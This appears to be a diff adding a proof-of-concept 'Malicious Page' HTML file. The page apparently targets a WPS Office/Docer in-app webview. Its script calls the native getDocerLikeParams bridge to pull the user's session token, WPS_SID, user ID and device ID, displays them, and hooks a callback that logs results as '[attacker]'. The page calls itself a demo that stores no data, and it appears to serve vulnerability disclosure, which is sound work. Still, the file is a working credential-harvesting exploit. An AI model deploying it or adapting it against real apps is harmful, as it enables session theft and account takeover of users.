@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+
+        p {
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+            overflow-wrap: break-word; 
+        }
+
+        .bold-and-larger {
+            font-weight: bold; 
+            font-size: 1.5em; 
+        }
+
+        .larger {
+            font-weight: bold; 
+            font-size: 1.2em; 
+        }
+
+    </style>
+    <title>Malicious Page</title>
+
+</head>
+
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p><span class="bold-and-larger">An attacker can:</span></p>
+    
+    <p><span class="larger">Get Your Personal Info:</span></p>
+    <p style="font-size: 15px;" id="MaskedPhoneNum"></p>
+    <p style="font-size: 15px;" id="Gender"></p>
+    <p style="font-size: 15px;" id="Birthday"></p>
+
+    <p><span class="larger">Get Your Account Info:</span></p>
+    <p style="font-size: 15px;" id="UserID"></p>
+    <p style="font-size: 15px;" id="Token"></p>
+    <p style="font-size: 15px;" id="HDID"></p>
+    <p style="font-size: 15px;" id="WPS_SID"></p>
+
+    <p style="font-size: 15px;" id="NickName">Your NickName: </p>
+    <p style="font-size: 15px;" id="AvatarText">Your Avatar: </p>
+    <div class="image-with-text">
+        <img id="Avatar" src="" alt="" width="30%" height="auto">
+    </div>
+    <p style="font-size: 15px;" id="Gender">Your Gender: </p>
+
+    <p style="font-size: 15px;" id="GUID">Your GUID: </p>
+
+    <p><span class="larger">Get Your Device Info:</span></p>
+    <p style="font-size: 15px;" id="IDFA"></p>
+
+
+    <br><br><br>
+
+    <script>
+        
+
+    window.docerLikeParamsCallback = function (res){
+        var json = JSON.parse(res);
+        document.getElementById("HDID").innerText = "Your HDID: \n" + json.hdid;
+        document.getElementById("WPS_SID").innerText = "Your WPS_SID: \n" + json.wps_sid;
+        document.getElementById("UserID").innerText = "Your UserID: \n" + json.userId;
+        document.getElementById("Token").innerText = "Your Token: \n" + json.token;
+        document.getElementById("Gender").innerText = "Your Gender: " + (json.gender == 1 ? "male" : "female") ;
+    }
+    window.webkit.messageHandlers.getDocerLikeParams.postMessage({});
+
+
+
+    window.wpsEventHandler.callbackEncode = function (callbackID, res){
+        result = JSON.stringify(res);
+        console.log("[attacker]:" + result);
+    }
+
+    
+
+
+
+    </script>
+
+</body>
+
+</html>
